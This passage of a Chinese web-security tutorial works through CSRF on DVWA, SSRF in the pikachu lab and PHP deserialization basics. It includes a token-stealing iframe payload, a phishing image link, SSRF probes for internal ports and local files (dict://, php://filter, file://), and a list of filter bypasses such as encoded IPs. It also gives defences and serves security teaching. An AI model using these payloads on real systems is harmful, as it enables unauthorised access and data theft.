        document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"submit"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/012220963/169.PNG" alt="169"></p>
<ol start="4">
<li>访问html，任何方式都可以</li>
</ol>
<ul>
<li>搭建公网服务器，生成链接</li>
<li>生成钓鱼链接</li>
</ul>
<p><img src="/2023/012220963/170.PNG" alt="170"></p>
<h3 id="dvwa靶场CSRF–high"><a href="#dvwa靶场CSRF–high" class="headerlink" title="dvwa靶场CSRF–high"></a>dvwa靶场CSRF–high</h3><p>获取user_token</p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html">＜iframe src='../csrf' onload=alert（frames[0].document.getElementsByName('user_token'）[0].value)＞<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>构造链接</p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>链接<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>//token要用上面获取到的

	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>404 error<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="CSRF-漏洞检测"><a href="#CSRF-漏洞检测" class="headerlink" title="CSRF 漏洞检测"></a>CSRF 漏洞检测</h3><ol>
<li><p>确定网站的功能，去测试 存在<strong>修改</strong>、<strong>添加</strong>等功能的战</p>
</li>
<li><p>CSRF只能通过用户的正规操作进行攻击</p>
</li>
<li><p>抓包查看，如果没有token验证，并且不检查referer字段则大概率会出现csrf漏洞</p>
</li>
<li><p>构造poc去测试，如果修改信息成功，则存在csrf</p>
</li>
</ol>
<h3 id="CSRF-漏洞防御"><a href="#CSRF-漏洞防御" class="headerlink" title="CSRF 漏洞防御"></a>CSRF 漏洞防御</h3><ul>
<li><p>在请求地址中添加 token 验证（最有效）</p>
</li>
<li><p>验证 HTTP Referer 字段</p>
</li>
<li><p>在 HTTP 头中自定义属性并验证</p>
</li>
<li><p>使用验证码或者密码确认方式进行</p>
</li>
</ul>
<h2 id="SSRF服务端请求伪造"><a href="#SSRF服务端请求伪造" class="headerlink" title="SSRF服务端请求伪造"></a>SSRF服务端请求伪造</h2><p>SSRF (Server-Side Request Forgery，服务器端请求伪造）是一种由攻击者构造请求，由服务端发起请</p>
<p>求的安全漏洞。</p>
<p>一些服务端提供了从其他服务器应用获取数据的功能，但又没有对目标地址做严格过滤与限制，导致攻</p>
<p>击者可以传入任意的地址来让后端服务器对其发起请求，并返回对该目标地址请求的数据。</p>
<p><strong>SSRF影响外网访问不了的内网系统。</strong></p>
<h3 id="SSRF图解"><a href="#SSRF图解" class="headerlink" title="SSRF图解"></a>SSRF图解</h3><p><a target="_blank" rel="noopener" href="http://www.xxx.com/a.php?image=http://192.168.0.109/xxx.png">http://www.xxx.com/a.php?image=http://192.168.0.109/xxx.png</a></p>
<p><img src="/2023/012220963/171.PNG" alt="171"></p>
<p>正常业务流程：用户访问浏览器，浏览器请求服务器，服务器再从109内网机器去获取资源</p>
<p>如果服务器对 image参数的链接 校验不完善，我们就可以请求任意的ip、或者是url资源</p>
<h3 id="SSRF危害"><a href="#SSRF危害" class="headerlink" title="SSRF危害"></a>SSRF危害</h3><ul>
<li><p>对外网、服务器所在内网、本地进行端口扫描</p>
</li>
<li><p>攻击运行在内网或本地的应用程序</p>
</li>
<li><p>对内网 WEB 应用进行指纹识别，通过访问默认文件实现 (如：readme文件)</p>
</li>
<li><p>攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击 (如：Struts2，SQLi)</p>
</li>
<li><p>下载内网资源(利用file协议读取本地文件等)</p>
</li>
<li><p>进行跳板</p>
</li>
<li><p>无视cdn</p>
</li>
<li><p>利用Redis未授权访问，HTTP CRLF注入实现getshell</p>
</li>
</ul>
<h3 id="引发SSRF的函数"><a href="#引发SSRF的函数" class="headerlink" title="引发SSRF的函数"></a>引发SSRF的函数</h3><p><strong>file_get_contents()</strong></p>
<p>功能：把整个文件读入一个字符串中。</p>
<p>file_get_contents()支持读取远程文件。</p>
<p><strong>curl_exec()</strong></p>
<p>功能：初始化一个cURL会话，设置参数之后调用。</p>
<p>curl_exec()函数主要就是调用curl。</p>
<p>curl是一个利用URL语法在命令行下工作的文件传输工具，它可以进行网络请求。</p>
<p>curl支持很多协议，有FTP, FTPS, HTTP, HTTPS, GOPHER, TELNET, DICT, FILE以及LDAP。</p>
<p><strong>fsockopen()</strong></p>
<p>功能：打开一个网络连接或者一个Unix套接字连接。</p>
<p>socket是套接字，也就是发起网络请求，同样也能够进行SSRF攻击。</p>
<h3 id="SSRF漏洞攻击"><a href="#SSRF漏洞攻击" class="headerlink" title="SSRF漏洞攻击"></a>SSRF漏洞攻击</h3><h4 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h4><p>环境：pikachu靶场 SSRF Curl</p>
<p>工具：burpsuit</p>
<p>开启一台内网 linux服务器</p>
<ol>
<li>正常访问网站</li>
<li>修改链接为 <a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a></li>
</ol>
<p><img src="/2023/012220963/172.PNG" alt="172"></p>
<ol start="3">
<li>修改链接为内网linux的ip</li>
</ol>
<p>​    <a target="_blank" rel="noopener" href="http://192.168.111.136/">http://192.168.111.136</a></p>
<ol start="4">
<li>加上端口号，实现了内网服务探测</li>
</ol>
<p>​    <a href="http://192.168.111.136：22">http://192.168.111.136：22</a></p>
<p><img src="/2023/012220963/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%5C173.PNG" alt="173"></p>
<p>​    同样可以使用dict协议实现</p>
<p>​    dict://127.0.0.1:3306</p>
<p><img src="/2023/012220963/174.PNG" alt="174"></p>
<h4 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents"></a>file_get_contents</h4><p>环境：pikachu靶场 SSRF fgc</p>
<p>工具：burpsuit</p>
<ol>
<li>正常访问网站</li>
<li>修改链接为<a target="_blank" rel="noopener" href="http://www.baidu.com/">http://www.baidu.com</a></li>
</ol>
<p><img src="/2023/012220963/175.PNG" alt="175"></p>
<ol start="3">
<li>修改链接为 php://filter/read=convert.base64-encode/resource=ssrf.php</li>
</ol>
<p><img src="/2023/012220963/176.PNG" alt="176"></p>
<ol start="4">
<li>修改链接为file://D:/a.txt</li>
</ol>
<p><img src="/2023/012220963/177.PNG" alt="177"></p>
<h3 id="SSRF查找"><a href="#SSRF查找" class="headerlink" title="SSRF查找"></a>SSRF查找</h3><p><strong>从web功能查找</strong></p>
<p>存在以下功能的网站，有可能存在SSRF漏洞</p>
<ul>
<li><p>图片上传、下载功能，可能通过url参数访问资源</p>
</li>
<li><p>收藏功能，可能会包含收藏的目标地址</p>
</li>
<li><p>分享功能，可能会包含分享网站的目标地址</p>
</li>
<li><p>API接口，可能会包含下面的参数</p>
</li>
</ul>
<p><strong>从url中查找</strong></p>
<p>url中存在以下关键字，有可能存在SSRF漏洞</p>
<ul>
<li><p>share</p>
</li>
<li><p>wap</p>
</li>
<li><p>url</p>
</li>
<li><p>link</p>
</li>
<li><p>src</p>
</li>
<li><p>source</p>
</li>
<li><p>target</p>
</li>
<li><p>u</p>
</li>
<li><p>3g</p>
</li>
<li><p>display</p>
</li>
<li><p>domain</p>
</li>
<li><p>sourceURL</p>
</li>
<li><p>imageURL</p>
</li>
</ul>
<h3 id="SSRF绕过"><a href="#SSRF绕过" class="headerlink" title="SSRF绕过"></a>SSRF绕过</h3><h4 id="利用-1"><a href="#利用-1" class="headerlink" title="利用[::]"></a>利用[::]</h4><p>利用[::]绕过localhost</p>
<p>http://[::]:80/ &gt;&gt;&gt; <a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127.0.0.1</a></p>
<h4 id="利用-2"><a href="#利用-2" class="headerlink" title="利用@"></a>利用@</h4><p><a target="_blank" rel="noopener" href="http://example.com@127.0.0.1/">http://example.com@127.0.0.1</a></p>
<h4 id="使用短链接"><a href="#使用短链接" class="headerlink" title="使用短链接"></a>使用短链接</h4><p><a target="_blank" rel="noopener" href="https://dwz.cn/console/operation">https://dwz.cn/console/operation</a></p>
<h4 id="利用DNS解析"><a href="#利用DNS解析" class="headerlink" title="利用DNS解析"></a>利用DNS解析</h4><p>在域名控制台中添加A记录，解析到127.0.0.1</p>
<h4 id="利用Enclosed-alphanumerics"><a href="#利用Enclosed-alphanumerics" class="headerlink" title="利用Enclosed alphanumerics"></a>利用Enclosed alphanumerics</h4><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">利用Enclosed alphanumerics
ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ &gt;&gt;&gt; example.com
List:
① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳
⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇
⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛
⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵
Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ
ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ
⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴
⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>①②⑦.⓪.⓪.① = 127.0.0.1</p>
<pre class="line-numbers language-URL" data-language="URL"><code class="language-URL">http:&#x2F;&#x2F;①②⑦.⓪.⓪.①<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h4><p>ipv4可以进行进制转换</p>
<p>禁止可以是十六进制，八进制等。</p>
<p>例如：127.0.0.1 &gt;&gt;&gt; 2130706433</p>
<p>首先把这四段数字给分别转成16进制，结果：7F 00 00 01</p>
<p>然后把 7F 00 00 01 这十六进制一起转换成8进制</p>
<p>记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样)，</p>
<p>十六进制加0x</p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127.0.0.1</a></p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/">http://2130706433</a></p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/">http://0x7F000001</a></p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/">http://017700000001</a></p>
<h4 id="句号绕过"><a href="#句号绕过" class="headerlink" title="句号绕过"></a>句号绕过</h4><p>ip：127。0。0。1 = 127.0.0.1</p>
<pre class="line-numbers language-HTTP" data-language="HTTP"><code class="language-HTTP">http:&#x2F;&#x2F;127。0。0。1 
http:&#x2F;&#x2F;www.baidu。com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h4 id="组合绕过"><a href="#组合绕过" class="headerlink" title="组合绕过"></a>组合绕过</h4><p>使用以上方法的组合</p>
<pre class="line-numbers language-HTML" data-language="HTML"><code class="language-HTML">http:&#x2F;&#x2F;①②⑦。⓪。⓪。①<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h3 id="SSRF漏洞防御"><a href="#SSRF漏洞防御" class="headerlink" title="SSRF漏洞防御"></a>SSRF漏洞防御</h3><ul>
<li><p>禁用不需要的协议，仅仅允许http和https请求。可以防止file://、gopher://、ftp://等引起的问题</p>
</li>
<li><p>设置url名单或者限制内网ip</p>
</li>
<li><p>统一错误信息，防止利用错误信息来判断远端服务器的端口状态</p>
</li>
</ul>
<h2 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h2><p>反序列化漏洞是指用户可控的数据被网站反序列化。</p>
<p>攻击者能够操纵序列化对象，以便将有害数据传递到应用程序的代码当中。甚至可以用完全不同的类的</p>
<p>对象替换序列化对象</p>
<p>许多基于反序列化的攻击是在反序列化完成之前完成的</p>
<p>不安全的反序列化通常是因为普遍缺乏对反序列化用户可控数据的危险程度的理解。理想情况下，用户</p>
<p>输入根本不应该被反序列化。</p>
<p>然而，有时网站所有者认为他们是安全的，因为他们对反序列化数据实施了某种形式的额外检查。这种</p>
<p>方法通常是无效的，因为几乎不可能实施验证或清理来解释所有可能发生的情况。这些检查也存在根本</p>
<p>性的缺陷，因为它们依赖于在反序列化后检查数据，在许多情况下，这对于防止攻击为时已晚。</p>
<p>由于反序列化的对象通常被认为是值得信赖的，因此也可能会出现漏洞。尤其是在使用二进制序列化格</p>
<p>式的语言时，开发人员可能会认为用户无法有效地读取或操作数据。然而，虽然这可能需要更多的努</p>
<p>力，但攻击者利用二进制序列化对象的可能性就如同利用基于字符串的格式一样。</p>
<p>由于现代网站中存在大量依赖项，基于反序列化的攻击也成为可能。一个典型的站点可能会实现许多不</p>
<p>同的库，每个库也有自己的依赖项。这会创建大量难以安全管理的类和方法。由于攻击者可以创建任何</p>
<p>这些类的实例，因此很难预测可以对恶意数据调用哪些方法。如果攻击者能够将一系列意外的方法调用</p>
<p>链接在一起，将数据传递到与初始源完全无关的接收器中，则尤其如此。因此，几乎不可能预测恶意数</p>
<p>据的流动并堵住每一个潜在的漏洞。</p>
<p>简而言之，可以说不可能安全地反序列化不受信任的输入。</p>
<h3 id="初探反序列化漏洞"><a href="#初探反序列化漏洞" class="headerlink" title="初探反序列化漏洞"></a>初探反序列化漏洞</h3><h4 id="什么是反序列化"><a href="#什么是反序列化" class="headerlink" title="什么是反序列化"></a>什么是反序列化</h4><p>序列化（Serialization）是将<strong>对象的状态信息</strong>转换为可以存储或传输的形式的过程。在序列化期间，对</p>
<p>象将其当前状态写入到临时或持久性存储区。以后，可以通过从存储区中读取或反序列化对象的状态，</p>
<p><strong>重新创建该对象</strong></p>
<h5 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h5><p><strong>serialize()序列化</strong></p>
<p>函数用于序列化对象或数组，并<strong>返回一个字符串</strong>。序列化对象后，可以很方便的将它传递给其他需要它</p>
<p>的地方，且其类型和结构不会改变。如果想要将已序列化的字符串变回 PHP 的值，可使用 unserialize()</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword type-declaration">string</span> <span class="token function">serialize</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">mixed</span> <span class="token variable">$value</span> <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p><strong>unserialize()反序列化</strong></p>
<p>unserialize() 函数用于将通过 serialize() 函数序列化后的对象或数组进行反序列化，并<strong>返回原始的对象</strong></p>
<p><strong>结构</strong>。</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">unserialize</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$str</span> <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p><strong>PHP序列化后的基本类型表达</strong></p>
<p><img src="/2023/012220963/178.PNG" alt="178"></p>
<h5 id="简单代码实例"><a href="#简单代码实例" class="headerlink" title="简单代码实例"></a>简单代码实例</h5><p><strong>php运行环境准备</strong></p>
<ul>
<li>将php目录添加到环境变量中</li>
</ul>
<p><strong>serialize()</strong></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">// 反序列化一个字符串</span>
<span class="token variable">$str1</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"abcdefg"</span><span class="token punctuation">;</span>
<span class="token variable">$str2</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$str1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$str2</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
<span class="token comment">// 反序列化一个数组</span>
<span class="token variable">$arr1</span> <span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"aaa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"bbbb"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ccccc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$arr2</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$arr1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$arr2</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
<span class="token comment">// 创建一个类</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">myClass</span> <span class="token punctuation">&#123;</span>
<span class="token keyword">var</span> <span class="token variable">$var1</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> <span class="token variable">$var2</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"class1"</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function-definition function">myfunc</span> <span class="token punctuation">(</span><span class="token variable">$arg1</span><span class="token punctuation">,</span> <span class="token variable">$arg2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"hello"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">// new一个对象</span>
<span class="token variable">$obj1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">myClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 反序列化一个对象</span>
<span class="token variable">$obj2</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$obj1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$obj2</span><span class="token punctuation">;</span>
<span class="token comment">// 序列化只会序列化属性，不会序列化方法</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p><strong>unserialize()</strong></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">s:7:"abcdefg";
a:3:&#123;i:0;s:3:"aaa";i:1;s:4:"bbbb";i:2;s:5:"ccccc";&#125;
O:7:"myClass":2:&#123;s:4:"var1";N;s:4:"var2";s:6:"class1";&#125;
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$str1</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'s:7:"abcdefg";'</span><span class="token punctuation">;</span>
<span class="token variable">$str2</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$str1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
<span class="token variable">$arr1</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'a:3:&#123;i:0;s:3:"aaa";i:1;s:4:"bbbb";i:2;s:5:"ccccc";&#125;'</span><span class="token punctuation">;</span>
<span class="token variable">$arr2</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$arr1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$arr2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
<span class="token variable">$obj1</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'O:7:"myClass":3:
&#123;s:4:"var1";N;s:4:"var2";s:6:"class1";s:4:"var3";i:123;&#125;'</span><span class="token punctuation">;</span>
<span class="token variable">$obj2</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$obj1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$obj2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h4 id="为什么会产生反序列化漏洞"><a href="#为什么会产生反序列化漏洞" class="headerlink" title="为什么会产生反序列化漏洞"></a>为什么会产生反序列化漏洞</h4><h5 id="魔术方法触发反序列化"><a href="#魔术方法触发反序列化" class="headerlink" title="魔术方法触发反序列化"></a>魔术方法触发反序列化</h5><p>PHP将所有以（两个下划线）开头的类方法保留为魔术方法。所以在定义类方法时，除了上述魔术方</p>
<p>法，建议不要以 “ <strong>__</strong> “ 为前缀。</p>
<p>常见的魔术方法：</p>
<p> __construct() 当一个对象创建的时候被调用</p>
<p> __destruct() 当一个对象销毁的时候被调用</p>
<p> __toString() 当一个对象被当作字符串使用的时候被调用</p>
<p> __invoke 当尝试以调用函数的方式调用一个对象时，会被调用</p>
<p> __sleep() 当对象在被序列化之前运行</p>
<p> __wakeup() 当在被反序列化之后调用</p>
<p> __get() 访问私有变量或不存在的变量均会触发</p>
<p> __set() 给私有变量或不存在的变量赋值时，会触发</p>
<p> __unset 对私有变量或不存在的变量调用unset时，会触发</p>
<p> __call 在对象中调用一个不可访问方法时，会被调用</p>
<p>更多的魔术方法：<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.magic.php">https://www.php.net/manual/zh/language.oop5.magic.php</a></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">myClass</span><span class="token punctuation">&#123;</span>
<span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"hello"</span><span class="token punctuation">;</span>
<span class="token keyword">private</span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"20"</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
<span class="token variable">$this</span><span class="token operator">-></span><span class="token property">age</span> <span class="token operator">=</span> <span class="token variable">$age</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token operator">.</span><span class="token string double-quoted-string">",I'm __construct().\n"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
<span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token operator">.</span><span class="token string double-quoted-string">",I'm __destruct().\n"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
<span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token operator">.</span><span class="token string double-quoted-string">",I'm __toString()."</span><span class="token punctuation">;</span>
<span class="token keyword">return</span> <span class="token string double-quoted-string">"111\n"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
<span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token operator">.</span><span class="token string double-quoted-string">",I'm __invoke().\n"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">function</span> <span class="token function-definition function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
<span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token operator">.</span><span class="token string double-quoted-string">",I'm __sleep().\n"</span><span class="token punctuation">;</span>
<span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"hello,I'm __wakeup().\n"</span><span class="token punctuation">;</span>
<span class="token keyword">return</span> <span class="token number">123123</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$arg1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"hello,I'm __get().\n"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">function</span> <span class="token function-definition function">__set</span><span class="token punctuation">(</span><span class="token variable">$arg1</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"hello,I'm __set().\n"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">function</span> <span class="token function-definition function">__unset</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"hello,I'm __unset().\n"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"hello,I'm __call().\n"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">hidden</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">// 触发 __construct()</span>
<span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">myClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 触发 __toString()</span>
<span class="token keyword">echo</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
<span class="token comment">// 触发 __invoke()</span>
<span class="token variable">$obj</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 触发 __sleep()</span>
<span class="token variable">$str1</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 触发 __wakeup()</span>
